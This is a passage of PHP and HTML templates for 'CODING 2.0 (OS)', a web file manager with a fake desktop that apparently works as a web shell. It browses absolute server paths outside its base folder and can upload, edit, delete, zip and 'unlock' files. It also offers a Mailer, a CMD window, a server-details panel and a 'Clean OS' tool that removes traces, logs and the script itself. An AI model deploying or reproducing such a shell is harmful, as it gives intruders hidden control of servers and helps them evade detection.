                <button class="settings-eye" type="button" id="set-new-toggle" title="Show/Hide"><span class="material-symbols-rounded">visibility</span></button>
            </div>
            <div class="settings-row">
                <div class="label">Confirm password</div>
                <span class="material-symbols-rounded pw-icon" aria-hidden="true">password</span>
                <input class="settings-input" type="password" id="set-confirm" placeholder="Confirm new password" aria-label="Confirm password" />
                <button class="settings-eye" type="button" id="set-conf-toggle" title="Show/Hide"><span class="material-symbols-rounded">visibility</span></button>
            </div>
        </div>
        <div class="settings-actions">
            <button class="btn btn-gen" type="button" id="set-generate" title="Generate"><span class="material-symbols-rounded">key</span><span>Generate</span></button>
            <button class="btn btn-copy" type="button" id="set-copy" title="Copy"><span class="material-symbols-rounded">content_copy</span><span>Copy</span></button>
            <div style="flex:1"></div>
            <button class="btn btn-save" type="button" id="set-save" title="Save"><span class="material-symbols-rounded">check_circle</span><span>Save</span></button>
        </div>
    </div>
    <!-- Layer to hold Settings windows -->
    <div id="settings-layer"></div>
    <!-- Wallpaper popup template -->
    <div class="wallpaper-window" id="wallpaper-template" role="dialog" aria-label="Wallpaper" style="display:none;">
        <div class="wallpaper-titlebar">
            <div class="wallpaper-title">Wallpaper</div>
            <button class="wallpaper-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="wallpaper-body">
            <input class="wp-url" type="text" placeholder="Enter image URL (http/https/data URI or local filename)" aria-label="Wallpaper URL" />
            <button class="wp-btn wp-type1" type="button" title="Type 1 (Mac)" aria-label="Type 1"><span class="material-symbols-rounded">image</span> Type 1</button>
            <button class="wp-btn wp-type2" type="button" title="Type 2 (Old default)" aria-label="Type 2"><span class="material-symbols-rounded">palette</span> Type 2</button>
            <button class="wp-btn wp-type3" type="button" title="Type 3 (Green 3D balls)" aria-label="Type 3"><span class="material-symbols-rounded">blur_on</span> Type 3</button>
            <button class="wp-btn wp-type4" type="button" title="Type 4 (Alphacoders image)" aria-label="Type 4"><span class="material-symbols-rounded">wallpaper</span> Type 4</button>
            <button class="wp-btn wp-type5" type="button" title="Type 5 (Windows XP)" aria-label="Type 5"><span class="material-symbols-rounded">desktop_windows</span> Type 5</button>
            <button class="wp-btn wp-type6" type="button" title="Type 6 (Windows 10 Pro)" aria-label="Type 6"><span class="material-symbols-rounded">monitor</span> Type 6</button>
            <button class="wp-btn wp-type7" type="button" title="Type 7 (Windows 11)" aria-label="Type 7"><span class="material-symbols-rounded">desktop_windows</span> Type 7</button>
            <button class="wp-btn wp-type8" type="button" title="Type 8 (Anonymous Mask)" aria-label="Type 8"><span class="material-symbols-rounded">person</span> Type 8</button>
            <button class="wp-btn wp-apply" type="button" title="Change" aria-label="Change"><span class="material-symbols-rounded">check_circle</span> Change</button>
            <button class="wp-btn wp-reset" type="button" title="Reset" aria-label="Reset"><span class="material-symbols-rounded">restart_alt</span> Reset</button>
            <div class="wallpaper-help">Choose Type 1 (Mac), Type 2 (Old default), Type 3 (Green 3D balls), Type 4 (Alphacoders), Type 5 (Windows XP), Type 6 (Windows 10 Pro), Type 7 (Windows 11), Type 8 (Anonymous Mask), or paste a link. Changes apply instantly and persist locally. Reset restores the current default.</div>
            <div class="wallpaper-footer">© wall.alphacoders.com — All rights reserved. Download any free wallpaper from this website.</div>
        </div>
    </div>
    <!-- Layer to hold Wallpaper windows -->
    <div id="wallpaper-layer"></div>
    
    <!-- CMD popup template -->
    <div class="cmd-window" id="cmd-template" role="dialog" aria-label="CMD" style="display:none;">
        <div class="cmd-titlebar">
            <div class="cmd-title">CMD</div>
            <button class="cmd-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="cmd-body">
            <div class="cmd-output" aria-live="polite"></div>
            <div class="cmd-input-row">
                <span class="cmd-prompt" aria-hidden="true">$</span>
                <input class="cmd-input" type="text" placeholder="Type a command (help, echo, date, clear, sum, open)" aria-label="Command input" />
            </div>
        </div>
    </div>
    <!-- Layer to hold CMD windows -->
    <div id="cmd-layer"></div>
    <!-- Clean OS popup template -->
    <div class="clean-window" id="clean-template" role="dialog" aria-label="Clean OS" style="display:none;">
        <div class="clean-titlebar">
            <div class="clean-title">Clean OS</div>
            <button class="clean-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="clean-body">
            <svg class="clean-icon clean-icon-large" viewBox="0 0 24 24" role="img" aria-label="Cleaning animation">
                <g fill="none" stroke="LawnGreen" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path class="broom-stick" d="M5 21 L19 5"/>
                    <path class="broom-head" d="M17 7 C16 9, 14 11, 12 12"/>
                    <path class="broom-bristle" d="M13 11 C12 12, 10 13, 8 14"/>
                    <circle class="sparkle s1" cx="7" cy="6" r="1"/>
                    <circle class="sparkle s2" cx="21" cy="12" r="1.2"/>
                    <circle class="sparkle s3" cx="12" cy="21" r="1"/>
                </g>
            </svg>
            <div class="clean-intro">Delete scripts, clear cookies/local storage, and remove traces. Use Advanced carefully.</div>
            <div class="clean-actions">
                <button class="btn" type="button" id="clean-browser" title="Clean Browser"><span class="material-symbols-rounded">cookie</span><span>Clean Browser</span></button>
                <button class="btn" type="button" id="clean-server" title="Clean Server"><span class="material-symbols-rounded">delete</span><span>Clean Server</span></button>
                <span style="flex:1"></span>
                <button class="btn" type="button" id="clean-verify-ok" title="Verify"><span class="material-symbols-rounded">verified</span><span>Verify</span></button>
            </div>
            <div class="clean-checks">
                <label class="clean-check"><input type="checkbox" id="chk-trash"> <span>Clear trash log</span></label>
                <label class="clean-check"><input type="checkbox" id="chk-password"> <span>Remove password file</span></label>
                <label class="clean-check"><input type="checkbox" id="chk-self"> <span>Delete app script (Danger)</span></label>
                <input type="text" id="clean-confirm" class="clean-verify" placeholder="Type DELETE APP to confirm" aria-label="Danger confirm" />
            </div>
            <div class="clean-result" id="clean-result" aria-live="polite"></div>
        </div>
    </div>
    <!-- Layer to hold Clean OS windows -->
    <div id="clean-layer"></div>
    <!-- APPTools 1.0 popup template -->
    <div class="apptools-window" id="apptools-template" role="dialog" aria-label="APPTools 1.0" style="display:none;">
        <div class="apptools-titlebar">
            <div class="apptools-title">APPTools 1.0</div>
            <button class="apptools-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="apptools-body">
            <div class="apptools-card" data-app="notes" title="Open Notes" aria-label="Open Notes"><span class="material-symbols-rounded">edit_note</span><span class="label">Notes</span></div>
            <div class="apptools-card" data-app="mailer" title="Open Mailer" aria-label="Open Mailer"><span class="material-symbols-rounded">mail</span><span class="label">Mailer</span></div>
            <div class="apptools-card" data-app="browser" title="Open Browser" aria-label="Open Browser"><span class="material-symbols-rounded">public</span><span class="label">Browser</span></div>
            <div class="apptools-card" data-app="wallpaper" title="Open Wallpaper" aria-label="Open Wallpaper"><span class="material-symbols-rounded">wallpaper</span><span class="label">Wallpaper</span></div>
            <div class="apptools-card" data-app="cmd" title="Open CMD" aria-label="Open CMD"><span class="material-symbols-rounded">terminal</span><span class="label">CMD</span></div>
            <div class="apptools-card" data-app="clean" title="Open Clean OS" aria-label="Open Clean OS"><span class="material-symbols-rounded">cleaning_bucket</span><span class="label">Clean OS</span></div>
            <div class="apptools-card" data-app="trash" title="Open Trash" aria-label="Open Trash"><span class="material-symbols-rounded">delete</span><span class="label">Trash</span></div>
            <div class="apptools-card" data-app="settings" title="Open Settings" aria-label="Open Settings"><span class="material-symbols-rounded">settings</span><span class="label">Settings</span></div>
            <div class="apptools-card" data-app="about" title="Open About" aria-label="Open About"><span class="material-symbols-rounded">account_circle</span><span class="label">About</span></div>
        </div>
    </div>
    <!-- Layer to hold APPTools windows -->
    <div id="apptools-layer"></div>
    <!-- CMD Notification popup template -->
    <div class="cmd-notify-window" id="cmd-notify-template" role="dialog" aria-label="cmd.exe" style="display:none;">
        <div class="cmd-titlebar">
            <div class="cmd-title">cmd.exe</div>
            <button class="cmd-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="cmd-notify-body">
            <div class="cmd-output cmd-notify-output" aria-live="polite"></div>
        </div>
    </div>
    <!-- Layer to hold CMD notifications -->
    <div id="cmd-notify-layer"></div>
    <!-- About popup overlay -->
    <div id="about-overlay" role="dialog" aria-modal="true" aria-label="About">
        <div class="about-modal" role="document">
            <div class="about-header">
                <div class="about-title"><span class="material-symbols-rounded" aria-hidden="true">account_circle</span> About CODING 2.0 (OS)</div>
                <button class="about-close" id="about-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
            </div>
            <div class="about-body">
                <div class="about-logo">
                    <h2 class="logo-title" aria-label="CODING (OS)">
                        <span class="logo-text">C</span>
                        <span class="logo-o" aria-hidden="true">
                            <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="O loading">
                                <circle class="base" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" />
                                <circle class="spin" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                                <circle class="dot" cx="12" cy="12" r="2" />
                            </svg>
                        </span>
                        <span class="logo-text">ODING (OS)</span>
                    </h2>
                </div>
                <p class="about-desc">CODING 2.0 (OS) Operating System</p>
                <div class="about-meta">
                    <div class="item copyright"><span class="material-symbols-rounded">copyright</span> <span>Copyright  Mister klio 2026</span></div>
                    <div class="item system"><span class="material-symbols-rounded">workspace_premium</span> <span>System name: CODING 2.0 (OS) 1.0</span></div>
                    <div class="item latest"><span class="material-symbols-rounded">verified</span> <span>Latest version: 1.0</span></div>
                </div>
                <div class="about-info" style="text-align:center; color:#cfd6df; margin-top:8px;">
                    <span class="material-symbols-rounded" aria-hidden="true">code</span> PHP version: <?= h(PHP_VERSION) ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">router</span> IP system: <?= h($_SERVER['SERVER_ADDR'] ?? ($_SERVER['REMOTE_ADDR'] ?? 'unknown')) ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">memory</span> Software System: <?= h($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">dns</span> Server System: <?= h(php_uname('s') . ' ' . php_uname('r')) ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">link</span> Github: <a href="https://www.github.com/Misterklio" target="_blank" rel="noopener" style="color:#86f58b; text-decoration:none;">www.github.com/Misterklio</a>
                </div>
                <div class="about-end-logo" style="display:flex; justify-content:center; margin-top:12px;">
                    <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="Loading logo">
                        <circle class="base" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" />
                        <circle class="spin" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                        <circle class="dot" cx="12" cy="12" r="2" />
                    </svg>
                </div>
            </div>
        </div>
    </div>
    <!-- Centered dock icon to restore layout when minimized -->
    <div id="terminal-dock" role="dialog" aria-label="App Dock" style="display:none;">
        <button class="dock-terminal app-icon" id="dock-terminal-btn" type="button" title="APP 2.0" aria-label="APP 2.0" data-label="APP 2.0">
            <span class="dock-logo" aria-hidden="true">
                <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="Loading logo">
                    <circle class="base" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" />
                    <circle class="spin" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                    <circle class="dot" cx="12" cy="12" r="2" />
                </svg>
            </span>
        </button>
    </div>
    <!-- Draggable Browser dock icon while minimized -->
    <div id="browser-dock" role="dialog" aria-label="Browser Dock" style="display:none;">
        <button class="dock-browser app-icon" id="dock-browser-btn" type="button" title="Browser" aria-label="Open Browser" data-label="Browser">
            <span class="dock-logo" aria-hidden="true">
                <!-- Use alternate Browser OS icon for distinct identity -->
                <svg class="browser-os-icon-2" viewBox="0 0 24 24" role="img" aria-label="Browser OS icon alt">
                    <circle class="ring" cx="12" cy="12" r="9" stroke-width="3" fill="none" />
                    <path class="c-arc" d="M6 12a6 6 0 1 1 12 0" stroke-width="3" fill="none" stroke-linecap="round" />
                    <circle class="dot" cx="12" cy="12" r="2" />
                    <circle class="scan" cx="12" cy="12" r="9" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                </svg>
            </span>
        </button>
    </div>
    <!-- Draggable Notes dock icon while minimized -->
    <div id="notes-dock" role="dialog" aria-label="Notes Dock" style="display:none;">
        <button class="dock-notes app-icon" id="dock-notes-btn" type="button" title="Notes" aria-label="Open Notes" data-label="Notes">
            <span class="material-symbols-rounded" aria-hidden="true">edit_note</span>
        </button>
    </div>
    <!-- Draggable Mailer dock icon while minimized -->
    <div id="mailer-dock" role="dialog" aria-label="Mailer Dock" style="display:none;">
        <button class="dock-mailer app-icon" id="dock-mailer-btn" type="button" title="Mailer" aria-label="Open Mailer" data-label="Mailer">
            <span class="material-symbols-rounded" aria-hidden="true">mail</span>
        </button>
    </div>
    <!-- Draggable CMD dock icon while minimized -->
    <div id="cmd-dock" role="dialog" aria-label="CMD Dock" style="display:none;">
        <button class="dock-cmd app-icon" id="dock-cmd-btn" type="button" title="CMD" aria-label="Open CMD" data-label="CMD">
            <span class="material-symbols-rounded" aria-hidden="true">terminal</span>
        </button>
    </div>
    <!-- Draggable Settings dock icon while minimized -->
    <div id="settings-dock" role="dialog" aria-label="Settings Dock" style="display:none;">
        <button class="dock-settings app-icon" id="dock-settings-btn" type="button" title="Settings" aria-label="Open Settings" data-label="Settings">
            <span class="material-symbols-rounded" aria-hidden="true">settings</span>
        </button>
    </div>
    <!-- Draggable Wallpaper dock icon while minimized -->
    <div id="wallpaper-dock" role="dialog" aria-label="Wallpaper Dock" style="display:none;">
        <button class="dock-wallpaper app-icon" id="dock-wallpaper-btn" type="button" title="Wallpaper" aria-label="Open Wallpaper" data-label="Wallpaper">
            <span class="material-symbols-rounded" aria-hidden="true">wallpaper</span>
        </button>
    </div>
    <!-- Trash dock icon removed: Trash remains available via header only -->
    <!-- Login success terminal overlay (CMD-style) -->
    <div class="overlay-terminal" id="login-terminal-overlay" role="dialog" aria-modal="true" aria-label="Login Success">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> cmd.exe</div>
            </div>
            <div class="body">
                <div class="output" id="login-term-output">C:\> </div>
            </div>
        </div>
    </div>
    <!-- Confirm Reload terminal overlay (CMD-style) -->
    <div class="overlay-terminal" id="confirm-overlay" role="dialog" aria-modal="true" aria-label="Confirm Reload">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">cached</span> Confirm Reload</div>
                <button class="term-close" id="confirm-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">close</span></button>
            </div>
            <div class="body">
                <div class="output" id="confirm-output">$ Resend this page? It may repeat the last action.</div>
                <div style="margin-top:12px; text-align:center;">
                    <button class="icon-action" id="btn-cancel-reload" type="button" title="Cancel"><span class="material-symbols-rounded">cancel</span></button>
                    <button class="icon-action icon-confirm" id="btn-resend-reload" type="button" title="Resend"><span class="material-symbols-rounded">cached</span></button>
                </div>
            </div>
        </div>
    </div>
    <!-- Terminal-style window chrome -->
    <div class="terminal-chrome">
        <div class="terminal-bar">
            <div class="traffic">
                <a class="term-action term-logout" href="?logout=1" title="Logout" aria-label="Logout"><span class="material-symbols-rounded">logout</span></a>
                <button class="term-action term-minimize" id="term-minimize" type="button" title="Hide" aria-label="Hide"><span class="material-symbols-rounded">horizontal_rule</span></button>
            </div>
        <div class="term-title"><span class="material-symbols-rounded">terminal</span>
            <?php
            // Absolute-style clickable Current path from root. All segments navigable via `abs`
            $curParts  = array_values(array_filter(explode(DIRECTORY_SEPARATOR, ltrim($currentDir, DIRECTORY_SEPARATOR)), 'strlen'));
            echo 'Current: ';
            $segmentsOut = [];
            for ($i = 0; $i < count($curParts); $i++) {
                $part = $curParts[$i];
                $absAccum = DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, array_slice($curParts, 0, $i + 1));
                $segmentsOut[] = '<a href="?os=' . h(urlencode($absAccum)) . '">' . h($part) . '</a>';
            }
            echo '<span class="path-root">/</span> ' . implode(' / ', $segmentsOut);
            ?>
        </div>
            <?php $relCurrent = (strpos($currentDir, $BASE_DIR) === 0) ? ltrim(substr($currentDir, strlen($BASE_DIR)), DIRECTORY_SEPARATOR) : ''; ?>
            <?php if ($isOutsideBase): ?>
                <a class="term-action term-new" href="?new=1&os=<?= h(urlencode($currentDir)) ?>" title="Add" data-label="Add"><span class="material-symbols-rounded">add_circle</span></a>
                <a class="term-action term-upload" href="?upload=1&os=<?= h(urlencode($currentDir)) ?>" title="Upload" data-label="Upload"><span class="material-symbols-rounded">file_upload</span></a>
                <a class="term-action term-reload" href="#" id="reload-trigger" title="Reload" data-label="Reload"><span class="material-symbols-rounded">refresh</span></a>
            <?php else: ?>
                <a class="term-action term-new" href="?new=1<?= $relCurrent !== '' ? '&d=' . h(urlencode($relCurrent)) : '' ?>" title="Add" data-label="Add"><span class="material-symbols-rounded">add_circle</span></a>
                <a class="term-action term-upload" href="?upload=1<?= $relCurrent !== '' ? '&d=' . h(urlencode($relCurrent)) : '' ?>" title="Upload" data-label="Upload"><span class="material-symbols-rounded">file_upload</span></a>
                <a class="term-action term-reload" href="#" id="reload-trigger" title="Reload" data-label="Reload"><span class="material-symbols-rounded">refresh</span></a>
            <?php endif; ?>
            <?php if (!empty($prevLink)): ?>
                <a class="term-action term-back" href="<?= h($prevLink) ?>" title="Back" data-label="Back"><span class="material-symbols-rounded">arrow_back</span></a>
            <?php endif; ?>
        </div>
        <div class="command-pill">~ / <?= h(basename($currentDir)) ?> — zsh</div>
    </div>
    <div class="container">
        <?php if (!empty($error)): ?>
            <div class="error"><span class="material-symbols-rounded" aria-hidden="true">error</span> <?= h($error) ?></div>
        <?php endif; ?>
        <?php if (!empty($notice)): ?>
            <div class="notice"><span class="material-symbols-rounded">task_alt</span> <?= h($notice) ?></div>
        <?php endif; ?>

        <?php if ($canGoUp): ?>
            <?php if ($isOutsideBase): ?>
                <p class="go-up"><a href="?os=<?= h(urlencode($parent)) ?>"><span class="material-symbols-rounded">arrow_back</span> GO BACK</a></p>
            <?php else: ?>
                <?php $upRel = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $parent), DIRECTORY_SEPARATOR); ?>
                <p class="go-up"><a href="?d=<?= h(urlencode($upRel)) ?>"><span class="material-symbols-rounded">arrow_back</span> GO BACK</a></p>
            <?php endif; ?>
        <?php endif; ?>

        <table>
            <thead>
                <tr>
                    <th><span class="material-symbols-rounded th-icon">badge</span> Name</th>
                    <th class="muted"><span class="material-symbols-rounded th-icon">category</span> Type</th>
                    <th class="muted"><span class="material-symbols-rounded th-icon">straighten</span> Size</th>
                    <th class="muted"><span class="material-symbols-rounded th-icon">schedule</span> Modified</th>
                    <th><span class="material-symbols-rounded th-icon">tune</span> Actions</th>
                </tr>
            </thead>
            <tbody id="files-body">
            <?php
            foreach ($entries as $e) {
                if ($e === '.' || $e === '..') continue;
                $full = $currentDir . DIRECTORY_SEPARATOR . $e;
                $rel = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $full), DIRECTORY_SEPARATOR);
                $isDir = is_dir($full);
                $type = $isDir ? 'Directory' : 'File';
                $size = $isDir ? '-' : number_format((float)filesize($full));
                $mtime = date('Y-m-d H:i', (int)filemtime($full));
            echo '<tr>';
                // Choose icon based on type/extension
                $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
                if ($isDir) {
                    $icon = '<span class="material-symbols-rounded ic-folder">folder</span>';
                    if ($isOutsideBase) {
                echo '<td class="name-cell"><a class="folder-link name-ellipsis" href="?os=' . h(urlencode($full)) . '" title="' . h($e) . '">' . $icon . ' ' . h($e) . '</a></td>';
                    } else {
                echo '<td class="name-cell"><a class="folder-link name-ellipsis" href="?d=' . h(urlencode($rel)) . '" title="' . h($e) . '">' . $icon . ' ' . h($e) . '</a></td>';
                    }
                } else {
                    if ($ext === 'zip') {
                        $icon = '<span class="material-symbols-rounded ic-zip">package_2</span>';
                    } elseif ($ext === 'txt') {
                        $icon = '<span class="material-symbols-rounded ic-txt">sticky_note_2</span>';
                    } elseif ($ext === 'php') {
                        $icon = '<i class="fa-brands fa-php ic-php"></i>';
                    } elseif ($ext === 'html' || $ext === 'htm') {
                        $icon = '<i class="fa-brands fa-html5 ic-html"></i>';
                    } elseif ($ext === 'js') {
                        $icon = '<i class="fa-brands fa-js ic-js"></i>';
                    } elseif ($ext === 'css') {
                        $icon = '<i class="fa-brands fa-css3 ic-css"></i>';
                    } elseif (in_array($ext, ['jpg','jpeg','png','gif','webp','bmp','svg'], true)) {
                        $icon = '<span class="material-symbols-rounded ic-image">image</span>';
                    } else {
                        $icon = '<span class="material-symbols-rounded ic-file">file_present</span>';
                    }
                echo '<td class="name-cell"><span class="name-ellipsis" title="' . h($e) . '">' . $icon . ' ' . h($e) . '</span></td>';
                }
                echo '<td class="muted">' . h($type) . '</td>';
                echo '<td class="muted">' . h($size) . '</td>';
                echo '<td class="modified">' . h($mtime) . '</td>';
                echo '<td class="actions">';
                if ($isOutsideBase) {
                    if ($isDir) {
                        // Absolute folder actions: Download, View, Rename, Delete, Zip, Unlock
                        echo '<a class="btn btn-icon" href="?download_abs=' . h(urlencode($full)) . '" aria-label="Download" title="Download" data-label="Download" data-kind="dir"><span class="material-symbols-rounded">download</span></a>';
                        echo '<a class="btn btn-view" href="?os=' . h(urlencode($full)) . '" aria-label="View" title="View"><span class="material-symbols-rounded">folder_open</span> VIEW</a>';
                        echo '<a class="btn btn-rename" href="?os=' . h(urlencode($full)) . '&rename_abs=1" title="Rename" aria-label="Rename"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?os=' . h(urlencode($full)) . '&delete_abs=1" aria-label="Delete" title="Delete" data-label="Delete"><span class="material-symbols-rounded">delete</span></a>';
                        echo '<a class="btn btn-zip" href="?os=' . h(urlencode($full)) . '&zip_abs=1" aria-label="Zip" title="Zip"><span class="material-symbols-rounded">package_2</span> Zip</a>';
                        // Unlock: posts do_unlock_abs with absolute directory
                        echo '<form method="post" style="display:inline">'
                            . '<input type="hidden" name="do_unlock_abs" value="1">'
                            . '<input type="hidden" name="os" value="' . h($full) . '">'
                            . '<button class="btn btn-icon" type="submit" title="Unlock" aria-label="Unlock"><span class="material-symbols-rounded">lock_open_right</span></button>'
                            . '</form>';
                    } else {
                        // Absolute file actions: Download, View for images, Edit otherwise, Rename, Delete, Unzip last for .zip
                        echo '<a class="btn btn-icon" href="?download_abs=' . h(urlencode($full)) . '" aria-label="Download" title="Download" data-label="Download" data-kind="file"><span class="material-symbols-rounded">download</span></a>';
                        $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
                        if (in_array($ext, ['png','jpg','jpeg','jpe','gif','webp','bmp','svg'])) {
                            echo '<a class="btn btn-view img-view" href="?raw_abs=' . h(urlencode($full)) . '" title="View" aria-label="View"><span class="material-symbols-rounded">visibility</span> VIEW</a>';
                        } else {
                            echo '<a class="btn btn-edit" href="?os=' . h(urlencode($full)) . '&edit_abs=1" title="Edit" aria-label="Edit"><span class="material-symbols-rounded">edit_square</span> Edit</a>';
                        }
                        echo '<a class="btn btn-rename" href="?os=' . h(urlencode($full)) . '&rename_abs=1" title="Rename" aria-label="Rename"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?os=' . h(urlencode($full)) . '&delete_abs=1" aria-label="Delete" title="Delete" data-label="Delete"><span class="material-symbols-rounded">delete</span></a>';
                        if ($ext === 'zip') {
                            echo '<a class="btn btn-unzip" href="?os=' . h(urlencode($full)) . '&unzip_abs=1" aria-label="Unzip" title="Unzip"><span class="material-symbols-rounded">unarchive</span> Unzip</a>';
                        }
                    }
                } else {
                    if ($isDir) {
                        // Folder actions: Download, View, Rename, Delete, Zip
                        echo '<a class="btn btn-icon" href="?download=' . h(urlencode($rel)) . '" aria-label="Download" title="Download" data-label="Download" data-kind="dir"><span class="material-symbols-rounded">download</span></a>';
                        echo '<a class="btn btn-view" href="?d=' . h(urlencode($rel)) . '" aria-label="View" title="View"><span class="material-symbols-rounded">folder_open</span> VIEW</a>';
                        echo '<a class="btn btn-rename" href="?d=' . h(urlencode($rel)) . '&rename=1" title="Rename" aria-label="Rename"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?d=' . h(urlencode($rel)) . '&delete=1" aria-label="Delete" title="Delete" data-label="Delete"><span class="material-symbols-rounded">delete</span></a>';
                        echo '<a class="btn btn-zip" href="?d=' . h(urlencode($rel)) . '&zip=1" aria-label="Zip" title="Zip"><span class="material-symbols-rounded">package_2</span> Zip</a>';
                    } else {
                        // File actions: Download, View for images, Edit otherwise, Rename, Delete, Unzip last for .zip
                        echo '<a class="btn btn-icon" href="?download=' . h(urlencode($rel)) . '" aria-label="Download" title="Download" data-label="Download" data-kind="file"><span class="material-symbols-rounded">download</span></a>';
                        $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
                        if (in_array($ext, ['png','jpg','jpeg','jpe','gif','webp','bmp','svg'])) {
                            echo '<a class="btn btn-view img-view" href="?raw=' . h(urlencode($rel)) . '" title="View" aria-label="View"><span class="material-symbols-rounded">visibility</span> VIEW</a>';
                        } else {
                            echo '<a class="btn btn-edit" href="?d=' . h(urlencode($rel)) . '&edit=1" title="Edit" aria-label="Edit"><span class="material-symbols-rounded">edit_square</span> Edit</a>';
                        }
                        echo '<a class="btn btn-rename" href="?d=' . h(urlencode($rel)) . '&rename=1" title="Rename" aria-label="Rename"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?d=' . h(urlencode($rel)) . '&delete=1" aria-label="Delete" title="Delete" data-label="Delete"><span class="material-symbols-rounded">delete</span></a>';
                        if ($ext === 'zip') {
                            echo '<a class="btn btn-unzip" href="?d=' . h(urlencode($rel)) . '&unzip=1" aria-label="Unzip" title="Unzip"><span class="material-symbols-rounded">unarchive</span> Unzip</a>';
                        }
                    }
                }
                echo '</td>';
                echo '</tr>';
            }
            ?>
            </tbody>
        </table>

        <?php
        // Upload form
        if (isset($_GET['upload'])) {
            echo '<h3 class="section-title"><span class="material-symbols-rounded">file_upload</span> Upload</h3>';
            $relDir = (strpos($currentDir, $BASE_DIR) === 0) ? ltrim(substr($currentDir, strlen($BASE_DIR)), DIRECTORY_SEPARATOR) : '';
            if ($isOutsideBase) {
                $backHref = '?os=' . h(urlencode($currentDir));
                $newHref = '?new=1&os=' . h(urlencode($currentDir));
            } else {
                $backHref = $relDir !== '' ? ('?d=' . h(urlencode($relDir))) : '?';
                $newHref = '?new=1' . ($relDir !== '' ? ('&d=' . h(urlencode($relDir))) : '');
            }
            echo '<div class="upload-row">'
                 . '<a class="btn-icon" href="' . $newHref . '" title="Add" data-label="Add"><span class="material-symbols-rounded">add_circle</span></a>'
                 . '<a class="btn-icon" href="' . $backHref . '" title="Back" data-label="Back"><span class="material-symbols-rounded">arrow_back</span></a>'
                 . '</div>';
            echo '<form method="post" class="form-wrap" enctype="multipart/form-data" style="text-align:center;">';
            if ($isOutsideBase) {
                echo '<input type="hidden" name="do_upload_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($currentDir) . '">';
            } else {
                echo '<input type="hidden" name="do_upload" value="1">';
                echo '<input type="hidden" name="dir" value="' . h($relDir) . '">';
            }
            echo '<div class="upload-pill" style="margin:12px auto; max-width:480px;">'
                . '<span class="material-symbols-rounded">file_upload</span>'
                . '<label for="upload-file" class="upload-label" id="upload-label" title="Choose a file…">Choose a file…</label>'
                . '<input type="file" id="upload-file" name="upload" accept="*/*">'
                . '</div>';
            echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Upload"><span class="material-symbols-rounded">check_circle</span></button></p>';
            echo '</form>';
            echo '<script>(function(){ var f=document.getElementById("upload-file"); var pill=document.querySelector(".upload-pill"); if(f&&pill){ pill.addEventListener("click", function(){ f.click(); }); f.addEventListener("change", function(){ if(f.files&&f.files.length){ pill.style.borderColor="#3b82f6"; pill.style.backgroundColor="rgba(59,130,246,0.1)"; } else { pill.style.borderColor=""; pill.style.backgroundColor=""; } }); } })();</script>';
        }
        // New (Create) form
        if (isset($_GET['new'])) {
            echo '<h3 class="section-title"><span class="material-symbols-rounded">add_circle</span> New</h3>';
            echo '<form method="post" class="form-wrap">';
            if ($isOutsideBase) {
                echo '<input type="hidden" name="do_create_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($currentDir) . '">';
            } else {
                echo '<input type="hidden" name="do_create" value="1">';
                $relDir = (strpos($currentDir, $BASE_DIR) === 0) ? ltrim(substr($currentDir, strlen($BASE_DIR)), DIRECTORY_SEPARATOR) : '';
                echo '<input type="hidden" name="dir" value="' . h($relDir) . '">';
            }
            echo '<p style="text-align:center; margin-bottom:12px;">';
            echo '<label style="margin-right:14px;"><input type="radio" name="create_type" value="file" checked> File</label>';
